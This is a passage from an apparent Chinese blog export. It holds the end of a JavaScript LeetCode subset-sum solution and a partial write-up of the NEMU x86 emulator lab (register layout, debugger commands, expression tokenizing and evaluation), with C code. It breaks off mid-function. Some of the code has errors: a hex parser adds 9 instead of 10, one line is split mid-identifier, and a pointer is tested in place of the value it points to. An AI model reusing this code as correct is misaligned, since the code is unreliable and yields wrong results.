class="number">0</span>;i&lt;n;i++</span>)</span>&#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//initial</span></span><br><span class="line">    dp[<span class="number">0</span>][nums[<span class="number">0</span>]] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//dp</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i=<span class="number">1</span>;i&lt;n;i++</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> num = nums[i];</span><br><span class="line">        <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> j=<span class="number">1</span>;j&lt;=target;j++</span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">j&lt;num</span>)</span>&#123;</span><br><span class="line">                dp[i][j] = dp[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j] = dp[i-<span class="number">1</span>][j-num] | dp[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[n-<span class="number">1</span>][target];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="optimization"><a class="markdownIt-Anchor" href="#optimization"></a> optimization</h2>
<p>考虑到在更新dp数组的状态的时候每次dp[i][j]都会以上一行作为参考进行状态转移，因此我们可以对于该数组进行空间优化,即将dp[n][target+1]修改为dp[target+1]，因此我们可以将空间复杂度由原来的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>×</mo><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n \times target)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>减少为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(target)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>。考虑到每一次更新状态时都要取上一行的状态，因此在更新状态时需要将j从大到小进行遍历。因为如果从小到大进行遍历的话，当计算dp[j]的状态是,dp[j-nums[i]]已经被更新过了，即被更新为第i行的数据，因此不可解。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i=<span class="number">1</span>;i&lt;n;i++</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> num = nums[i];</span><br><span class="line">        <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> j=target;j&gt;=num;j--</span>)</span>&#123;</span><br><span class="line">            dp[j] |= dp[j-num];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[target];</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>Leetcode</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>NEMU</title>
    <url>/2020/09/29/NEMU/</url>
    <content><![CDATA[<h2 id="get-started-起步"><a class="markdownIt-Anchor" href="#get-started-起步"></a> Get Started 起步</h2>
<h3 id="description-描述"><a class="markdownIt-Anchor" href="#description-描述"></a> Description 描述</h3>
<p>PA讲述的是一个&quot;先驱创造计算机&quot;的故事。</p>
<p>本实践课程所要设计的“NEMU”一款经过简化的 x86 全系统模拟器。</p>
<a id="more"></a>
<h3 id="pa0"><a class="markdownIt-Anchor" href="#pa0"></a> PA0</h3>
<p><strong>寄存器结构体</strong></p>
<p>在框架的源码中，为了考察我们寄存器的结构，作者故意地使用了错误的数据结构来描述寄存器。使用结构体来描述寄存器的内部结构，会错误地计算寄存器的地址空间。因此我们首先需要将结构体改为联合体来描述寄存器的地址。</p>
<p>在<code>include\cpu\reg.h</code>文件里修改寄存器的描述</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">			<span class="keyword">uint32_t</span> _32;</span><br><span class="line">			<span class="keyword">uint16_t</span> _16;</span><br><span class="line">			<span class="keyword">uint8_t</span> _8[<span class="number">2</span>];</span><br><span class="line">		&#125;gpr[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">		&#123;</span></span><br><span class="line">			<span class="keyword">uint32_t</span> eax, ecx, edx, ebx, esp, ebp, esi, edi;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">//store </span></span><br><span class="line">	<span class="keyword">swaddr_t</span> eip;</span><br><span class="line"></span><br><span class="line">&#125; CPU_state;</span><br></pre></td></tr></table></figure>
<h3 id="pa1"><a class="markdownIt-Anchor" href="#pa1"></a> PA1</h3>
<h4 id="单步执行"><a class="markdownIt-Anchor" href="#单步执行"></a> 单步执行</h4>
<p>完成这个操作很简单，因为框架已经实现了cpu_exec()函数模拟cpu的调用，我们只需读取命令行参数并且进行函数的调用就可以完成。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_si</span><span class="params">(<span class="keyword">char</span> *args)</span></span>&#123;</span><br><span class="line">	<span class="comment">//initliza the step</span></span><br><span class="line">	<span class="keyword">int</span> step = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(args == <span class="literal">NULL</span>)step=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sscanf</span>(args,<span class="string">&quot;%d&quot;</span>,&amp;step);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	cpu_exec(step);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="打印寄存器"><a class="markdownIt-Anchor" href="#打印寄存器"></a> 打印寄存器</h4>
<p>本题提供两个参数，‘r’表示打印寄存器状态，‘w’表示打印监视点，因为监视点需要和后面的任务有关，这里暂时先不讲。打印寄存器很简单，只需要调用寄存器的状态并将其打印出来即可，我们定义一个<code>printRegisters</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printRegisters</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;eax: 0x%-10x  %-10d\n&quot;</span>, cpu.eax, cpu.eax);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;edx: 0x%-10x  %-10d\n&quot;</span>, cpu.edx, cpu.edx);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ecx: 0x%-10x  %-10d\n&quot;</span>, cpu.ecx, cpu.ecx);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ebx: 0x%-10x  %-10d\n&quot;</span>, cpu.ebx, cpu.ebx);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ebp: 0x%-10x  %-10d\n&quot;</span>, cpu.ebp, cpu.ebp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;esi: 0x%-10x  %-10d\n&quot;</span>, cpu.esi, cpu.esi);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;esp: 0x%-10x  %-10d\n&quot;</span>, cpu.esp, cpu.esp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;eip: 0x%-10x  %-10d\n&quot;</span>, cpu.eip, cpu.eip);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="扫描内存"><a class="markdownIt-Anchor" href="#扫描内存"></a> 扫描内存</h4>
<p>扫描内存提供两个参数选项，扫描的地址和地址附近字节的内存扫描。因此我们只需要对命令行的两个参数分别进行处理就可以了。扫描的地址有简单和复杂两种状态。简单状态即输入16进制的数，复杂则可以输入表达式，复杂状态我们需要调用下一问中的表达式求值的函数进行解析。</p>
<p><strong>表达式只能是16进制数：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_x</span><span class="params">(<span class="keyword">char</span>* args)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(args == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uint32_t</span> num = <span class="number">0</span>, addr;</span><br><span class="line">	<span class="keyword">while</span>(args[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>)++args;	<span class="comment">//trim</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="string">&#x27;0&#x27;</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">&#x27;9&#x27;</span>) num = (num &lt;&lt; <span class="number">3</span>) + (num &lt;&lt; <span class="number">1</span>) + (args[<span class="number">0</span>] &amp; <span class="number">15</span>), ++args;</span><br><span class="line">	<span class="comment">//get num</span></span><br><span class="line">	<span class="keyword">while</span>(args[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>)++args; <span class="comment">//trim</span></span><br><span class="line">	<span class="comment">//get address</span></span><br><span class="line">	<span class="keyword">if</span>(args[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; args[<span class="number">1</span>] == <span class="string">&#x27;x&#x27;</span>)&#123;</span><br><span class="line">		args = args + <span class="number">2</span>;</span><br><span class="line">		addr = read_address(args);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>(num) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;address 0x%x:&quot;</span>, addr);</span><br><span class="line">			<span class="keyword">int</span> i;</span><br><span class="line">			<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">4</span>; i++)<span class="built_in">printf</span>(<span class="string">&quot; 0x%x&quot;</span>, swaddr_read(addr + i, <span class="number">1</span>));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			addr += <span class="number">4</span>;</span><br><span class="line">			--num;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[1;31mInvalid expression\n\033[0m&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先清除空格，然后读入数字并将数字求值，然后再读入地址将地址进行求值，我们写了一个解析地址的函数<code>read_address()</code>进行解析。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//read address</span></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">read_address</span><span class="params">(<span class="keyword">char</span> *args)</span></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> address;</span><br><span class="line">	address = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>((<span class="string">&#x27;0&#x27;</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">&#x27;9&#x27;</span>) || (<span class="string">&#x27;a&#x27;</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">&#x27;f&#x27;</span>) || (<span class="string">&#x27;A&#x27;</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">&#x27;F&#x27;</span>))&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="string">&#x27;0&#x27;</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">&#x27;9&#x27;</span>) </span><br><span class="line">                    address = (address&lt;&lt;<span class="number">4</span>)+((args[<span class="number">0</span>]-<span class="string">&#x27;0&#x27;</span>));</span><br><span class="line">				<span class="keyword">if</span>(<span class="string">&#x27;a&#x27;</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">&#x27;f&#x27;</span>) </span><br><span class="line">                    address = (address&lt;&lt;<span class="number">4</span>)+((args[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>)+<span class="number">9</span>);</span><br><span class="line">				<span class="keyword">if</span>(<span class="string">&#x27;A&#x27;</span> &lt;= args[<span class="number">0</span>] &amp;&amp; args[<span class="number">0</span>] &lt;= <span class="string">&#x27;F&#x27;</span>) a</span><br><span class="line">                    ddress = (address&lt;&lt;<span class="number">4</span>)+((args[<span class="number">0</span>]-<span class="string">&#x27;A&#x27;</span>)+<span class="number">9</span>);</span><br><span class="line">				++args;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>首先判断是否输入的是否为16进制数，如果不是则返回，否则则解析地址。将数字和地址解析完成后就可以使用内置的<code>swaddr_read</code>函数进行读取地址信息。</p>
<h4 id="数学表达式求值"><a class="markdownIt-Anchor" href="#数学表达式求值"></a> 数学表达式求值</h4>
<p>在本题中，我们主要需要为表达式添加规则，使用正则表达式为表达式每个可能出现的字符添加规则，并为其制定优先级来对其进行词法分析，最后再对其进行递归求值。</p>
<p>首先完成字符的正则表达式的匹配：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">rule</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> *regex;</span><br><span class="line">	<span class="keyword">int</span> token_type;</span><br><span class="line">&#125; rules[] = &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> Add more rules.</span></span><br><span class="line"><span class="comment">	 * Pay attention to the precedence level of different rules.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	&#123;<span class="string">&quot; +&quot;</span>,	NOTYPE&#125;,				<span class="comment">//spaces</span></span><br><span class="line">	&#123;<span class="string">&quot;\\+&quot;</span>, PLUS&#125;,					<span class="comment">//plus</span></span><br><span class="line">	&#123;<span class="string">&quot;-&quot;</span>, MINUS&#125;,					<span class="comment">//minus</span></span><br><span class="line">	&#123;<span class="string">&quot;\\*&quot;</span>, STAR&#125;,					<span class="comment">//star</span></span><br><span class="line">	&#123;<span class="string">&quot;/&quot;</span>, DIV&#125;,						<span class="comment">//div</span></span><br><span class="line">	&#123;<span class="string">&quot;==&quot;</span>, EQ&#125;,						<span class="comment">//eq</span></span><br><span class="line">	&#123;<span class="string">&quot;!=&quot;</span>, NOTEQ&#125;,					<span class="comment">//noteq</span></span><br><span class="line">	&#123;<span class="string">&quot;&amp;&amp;&quot;</span>, AND&#125;,					<span class="comment">//and</span></span><br><span class="line">	&#123;<span class="string">&quot;\\|\\|&quot;</span>, OR&#125;,					<span class="comment">//or</span></span><br><span class="line">	&#123;<span class="string">&quot;!&quot;</span>, NOT&#125;,						<span class="comment">//not</span></span><br><span class="line">	&#123;<span class="string">&quot;\\(&quot;</span>, LB&#125;,					<span class="comment">//lb</span></span><br><span class="line">	&#123;<span class="string">&quot;\\)&quot;</span>, RB&#125;,					<span class="comment">//rb</span></span><br><span class="line">	&#123;<span class="string">&quot;0[xX][0-9a-zA-Z]+&quot;</span>, HEX&#125;,		<span class="comment">//hex</span></span><br><span class="line">	&#123;<span class="string">&quot;[0-9]+&quot;</span>, DEC&#125;,				<span class="comment">//dec</span></span><br><span class="line">	&#123;<span class="string">&quot;\\$[a-z]+&quot;</span>, REG&#125;				<span class="comment">//reg</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在代码中我们为可能出现的字符进行了正则表达式的匹配。然后我们需要将识别出的token信息加入tokens数组中。在for循环中，用<code>regexec()</code>函数匹配目标文本字符串和前面定义的rules[i]中的正则表达式比较，pmatch.rm_so == 0表示匹配串在目标串的第一个位置，pmatch.rm_eo表示结束位置，position和substr_len表示读取完后的位置和读取长度。成功识别得到该字符或者字符串的对应规则后，用switch语句将表达式中每一个部分用对应的数字表示type，复制到tokens[nr_token].str中，用strncpy函数，末尾加上\0表示字符串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">make_token</span><span class="params">(<span class="keyword">char</span> *e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> position = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">regmatch_t</span> pmatch;</span><br><span class="line">	</span><br><span class="line">	nr_token = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(e[position] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">		<span class="comment">/* Try all rules one by one. */</span></span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NR_REGEX; i ++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(regexec(&amp;re[i], e + position, <span class="number">1</span>, &amp;pmatch, <span class="number">0</span>) == <span class="number">0</span> &amp;&amp; pmatch.rm_so == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="comment">//char *substr_start = e + position;</span></span><br><span class="line">				<span class="keyword">int</span> substr_len = pmatch.rm_eo;</span><br><span class="line">				<span class="comment">//Log(&quot;match rules[%d] = \&quot;%s\&quot; at position %d with len %d: %.*s&quot;, i, rules[i].regex, position, substr_len, substr_len, substr_start);</span></span><br><span class="line">				position += substr_len;</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* <span class="doctag">TODO:</span> Now a new token is recognized with rules[i]. Add codes</span></span><br><span class="line"><span class="comment">				 * to record the token in the array `tokens&#x27;. For certain types</span></span><br><span class="line"><span class="comment">				 * of tokens, some extra actions should be performed.</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">switch</span>(rules[i].token_type) &#123;</span><br><span class="line">					<span class="keyword">case</span> NOTYPE:</span><br><span class="line">						<span class="keyword">break</span>;											<span class="comment">//It&#x27;s blank!</span></span><br><span class="line">					<span class="keyword">case</span> HEX:<span class="keyword">case</span> DEC:<span class="keyword">case</span> REG:</span><br><span class="line">						<span class="built_in">strncpy</span>(tokens[nr_token].str, e + position - substr_len, substr_len);<span class="comment">//regs or number</span></span><br><span class="line">						tokens[nr_token].str[substr_len] = <span class="string">&#x27;\0&#x27;</span>;		<span class="comment">//add &#x27;\0&#x27;, it&#x27;s very important</span></span><br><span class="line">						<span class="comment">//WARNING: 64 may be a little small...</span></span><br><span class="line">					<span class="keyword">default</span>:</span><br><span class="line">						<span class="keyword">if</span>(rules[i].token_type == MINUS) &#123;	<span class="comment">//solve neg</span></span><br><span class="line">							<span class="keyword">if</span>(nr_token == <span class="number">0</span>) tokens[nr_token++].type = NEG;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span>(PLUS &lt;= tokens[nr_token - <span class="number">1</span>].type &amp;&amp; tokens[nr_token - <span class="number">1</span>].type &lt;= LB) &#123;</span><br><span class="line">								tokens[nr_token++].type = NEG;</span><br><span class="line">							&#125; <span class="keyword">else</span> tokens[nr_token++].type = MINUS;</span><br><span class="line">						&#125; <span class="keyword">else</span> <span class="keyword">if</span>(rules[i].token_type == STAR) &#123; <span class="comment">//solve pointer</span></span><br><span class="line">							<span class="keyword">if</span>(nr_token == <span class="number">0</span>) tokens[nr_token++].type = POINTER;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span>(PLUS &lt;= tokens[nr_token - <span class="number">1</span>].type &amp;&amp; tokens[nr_token - <span class="number">1</span>].type &lt;= LB) &#123;</span><br><span class="line">								tokens[nr_token++].type = POINTER;</span><br><span class="line">							&#125; <span class="keyword">else</span> tokens[nr_token++].type = STAR;</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							tokens[nr_token++].type = rules[i].token_type;	<span class="comment">//other	</span></span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="comment">//panic(&quot;please implement me&quot;);</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(i == NR_REGEX) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;no match at position %d\n%s\n%*.s^\n&quot;</span>, position, e, position, <span class="string">&quot;&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们需要需要将符号匹配的函数补全，函数提供了三个参数，表达式左侧指针l，右侧指针r，以及表示匹配结果的指针sucess，我们需要从左至右遍历token数组，检查其符号是否匹配，遍历的时候如果有左括号咋cnt加1，有右括号则将cnt减1，如果最终cnt不等于0则表示符号不匹配。如果i不等于r且cnt等于0时在表达式中有类似<code>()()</code>这种括号，需要将flag设置为0，否则则设为1。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check_parentheses</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">bool</span> *success)</span> </span>&#123;<span class="comment">//Check the parentheses, use stack.</span></span><br><span class="line">	*success = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">if</span>(l &gt; r) <span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt = <span class="number">0</span>, flag = <span class="number">1</span>, i;		<span class="comment">//A simple stack</span></span><br><span class="line">	<span class="keyword">for</span>(i = l;i &lt;= r; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(tokens[i].type == LB) ++cnt;</span><br><span class="line">		<span class="keyword">if</span>(tokens[i].type == RB) --cnt;</span><br><span class="line">		<span class="keyword">if</span>(cnt &lt; <span class="number">0</span>)	<span class="keyword">return</span> *success = <span class="literal">false</span>;<span class="comment">//Bad</span></span><br><span class="line">		<span class="keyword">if</span>(i != r &amp;&amp; cnt == <span class="number">0</span>) flag = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(cnt != <span class="number">0</span>) <span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后我们需要将eval函数填充完，在expr函数中我们调用了make_token函数和eval函数，make_token来判断表达式的格式是否正确，而在eval中我们则需要对表达式进行求值，同check_parentheses函数一样，eval也接受同样三个参数。如果传入的参数l&gt;r则直接将success设为false返回，如果l==r，则需要判断表达式是否为十进制数，十六进制数或者寄存器，若为这其中一种，则返回，否则表达式无意义，返回success为false。</p>
<p>当l&gt;r的时候，则需要先调用check_parentheses函数进行符号判断，如果符号不匹配则直接将success设为false返回。接着判断flag是否为1（即没有类似<code>()()</code>这种括号），为1的情况下则清除左右括号进行递归。否则需要遍历表达式将括号删掉，并且解决优先级的问题。</p>
<p>我们遍历所有的tokens，将符号优先级进行比较，找到优先级最低的符号，设置为now，将now的左边和now的右边分开方便递归。由于取反，取负，指针解引用都是对单侧进行操作且优先级最高，所以需要单独拿出来进行讨论，而其他符号则是对now指针的双侧进行操作，所以需要分别将两侧表达式求值进行递归处理。</p>
<p>最后eval函数及expr函数代码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">eval</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">bool</span> *success)</span> </span>&#123;</span><br><span class="line">	*success = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">if</span>(l &gt; r) <span class="keyword">return</span> *success = <span class="literal">false</span>;<span class="comment">// Bad Expression !!</span></span><br><span class="line">	<span class="keyword">if</span>(l == r)&#123;				<span class="comment">//It&#x27;s a number or reg, otherwise bad expression</span></span><br><span class="line">		<span class="keyword">uint32_t</span> tmp;</span><br><span class="line">		<span class="keyword">if</span>(tokens[l].type == HEX) &#123;</span><br><span class="line">			<span class="built_in">sscanf</span>(tokens[l].str, <span class="string">&quot;%x&quot;</span>, &amp;tmp);</span><br><span class="line">			<span class="keyword">return</span> tmp;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span>(tokens[l].type == DEC) &#123;</span><br><span class="line">			<span class="built_in">sscanf</span>(tokens[l].str, <span class="string">&quot;%d&quot;</span>, &amp;tmp);</span><br><span class="line">			<span class="keyword">return</span> tmp;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span>(tokens[l].type == REG) &#123;	<span class="comment">//read register</span></span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">&quot;eax&quot;</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.eax;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">&quot;ecx&quot;</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.ecx;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">&quot;edx&quot;</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.edx;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">&quot;ebx&quot;</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.ebx;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">&quot;esp&quot;</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.esp;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">&quot;ebp&quot;</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.ebp;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">&quot;esi&quot;</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.esi;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">&quot;edi&quot;</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.edi;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tokens[l].str + <span class="number">1</span>, <span class="string">&quot;eip&quot;</span>) == <span class="number">0</span>) <span class="keyword">return</span> cpu.eip;</span><br><span class="line">			<span class="keyword">return</span> *success = <span class="literal">false</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> *success = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">bool</span> flag = check_parentheses(l, r, success);</span><br><span class="line">	<span class="keyword">if</span>(!success) <span class="keyword">return</span> <span class="number">0</span>;						<span class="comment">//Bad</span></span><br><span class="line">	<span class="keyword">if</span>(flag) <span class="keyword">return</span> eval(l + <span class="number">1</span>, r - <span class="number">1</span>, success);<span class="comment">//OK, remove parentheses</span></span><br><span class="line">	<span class="comment">//Now we should find the dominant token</span></span><br><span class="line">	<span class="keyword">int</span> now = <span class="number">-1</span>, type = <span class="number">0x3f3f3f3f</span>, cnt = <span class="number">0</span>, i;</span><br><span class="line">	<span class="keyword">for</span>(i = l; i &lt;= r; i++) &#123;</span><br><span class="line">		